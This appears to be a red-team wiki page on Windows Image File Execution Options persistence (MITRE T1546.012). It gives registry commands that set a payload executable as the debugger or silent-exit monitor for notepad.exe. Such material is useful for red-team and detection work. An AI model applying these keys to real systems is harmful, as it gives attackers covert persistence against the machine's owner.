---
description: >-
  MITRE ATT&CK™ Event Triggered Execution: Image File Execution Options
  Injection - Technique T1546.012
---

# Image File Execution Options (IFEO) Persistence

## Theory

**Image File Execution Options (IFEO)** is a Windows registry key designed for developers to attach a debugger to an application and enable debugging features such as `GlobalFlag`. However, this functionality can be abused for persistence by specifying an arbitrary executable as the debugger for a target process or by using the `MonitorProcess` feature.

In both cases, code execution is achieved, with the trigger being either the creation of the specified process or the termination of an application. Notably, implementing this technique requires Administrator privileges, as modifications must be made under the `HKLM` registry hive.

## Practice

{% hint style="danger" %}
By editing Image File Execution Options, the original exe will not start
{% endhint %}

{% tabs %}
{% tab title="GlobalFlag" %}
With the GlobalFlag persistence technique, payload is triggered when the target application is closed.

```powershell
#Enables the silent exit monitoring for the notepad process.
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

#Enables the Windows Error Reporting process (WerFault.exe) which will be the parent process of the “MonitorProcess”
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

#Set up the arbitrary payload
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\payload.exe"
```
{% endtab %}

{% tab title="Debugger" %}
Using the debugger technique, we can define a binary that will be attached to the targeted process

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "C:\tmp\payload.exe"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/" %}

{% embed url="https://attack.mitre.org/techniques/T1546/012/" %}
